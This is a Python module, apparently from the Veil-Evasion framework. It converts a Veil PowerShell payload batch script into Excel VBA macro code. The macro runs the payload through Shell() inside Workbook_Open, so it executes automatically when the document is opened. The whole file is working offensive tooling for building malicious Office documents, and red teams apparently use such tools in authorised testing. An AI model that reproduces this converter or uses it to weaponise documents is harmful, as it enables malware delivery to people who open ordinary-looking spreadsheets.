"""
This module is designed to take a windows powershell batch script made by
Veil-Evasion powershell/virtual module and convert it to a macro

Module built by @christruncer but original conversion code was developed by khr040sh.
Blog post available at:
    https://khr0x40sh.wordpress.com/2014/06/02/embedding-veil-powershell-payloads-into-office-documents/
"""

from lib.common import helpers


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "Auxiliary script which converts Veil's powershell batch script to macro code"
        self.language = "powershell"
        self.rating = "Normal"
        self.extension = "txt"
        self.name = "Macro Converter"
        self.path = "auxuliary/macro_converter"
        self.cli_opts = cli_obj
        self.payload_source_code = ""

        self.required_options = {
            "POSH_BATCH": ["", "Path to a powershell batch script"],
            "ARCHITECTURE": ["x86", "x86 or x64"]
            }

    def generate(self):

        # Variables for path to our executable input and war output
        orig_posh_batch = self.required_options["POSH_BATCH"][0]

        try:
            # read in the executable
            with open(orig_posh_batch, 'r') as bat_file:
                batch_lines = bat_file.readlines()

        except IOError:
            print(helpers.color("\n [!] Powershell Script \"" + orig_posh_batch + "\" not found\n", warning=True))
            return ""

        cut = []

        for line in batch_lines:
            if "@echo off" not in line:
                first = line.split('else')
                # split on else to truncate the back half

                # split on \"
                cut = first[0].split('\\"', 4)

                # get rid of everything before powershell
                cut[0] = cut[0].split('%==x86')[1]
                cut[0] = cut[0][2:]

                # get rid of trailing parenthesis
                cut[2] = cut[2].strip(" ")
                cut[2] = cut[2][:-1]

        top = "Sub Workbook_Open()\r\n"
        top = top + "Dim str As String\r\n"
        top = top + "Dim exec As String\r\n"

        # insert '\r\n' and 'str = str +' every 48 chars after the first 54.
        payL = self.formStr("str", str(cut[1]))

        # double up double quotes, add the rest of the exec string
        idx = cut[0].index('"')
        cut[0] = cut[0][:idx] + '"' + cut[0][idx:]
        cut[0] = cut[0] + "\\\"\" \" & str & \" \\\"\" " + cut[2] +"\""
        execStr = self.formStr("exec", str(cut[0]))

        shell = "Shell(exec)"
        bottom = "End Sub\r\n\r\n"

        PayloadCode = ""
        PayloadCode = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"

        # Return
        self.payload_source_code = PayloadCode
        return

    def formStr(self, varstr, instr):
        holder = []
        str1 = ""
        str2 = ""
        print(self.required_options['ARCHITECTURE'])
        if varstr == "exec" and self.required_options['ARCHITECTURE'][0] == "x64":
            str1 = varstr + ' = "C:\\Windows\\syswow64\\windowspowershell\\v1.0\\' + instr[:54] + '"'
        else:
            str1 = varstr + ' = "' + instr[:54] + '"'
        for i in range(54, len(instr), 48):
            holder.append(varstr + ' = ' + varstr +' + "' + instr[i:i+48])
            str2 = '"\r\n'.join(holder)

        str2 = str2 + "\""
        str1 = str1 + "\r\n" + str2
        return str1
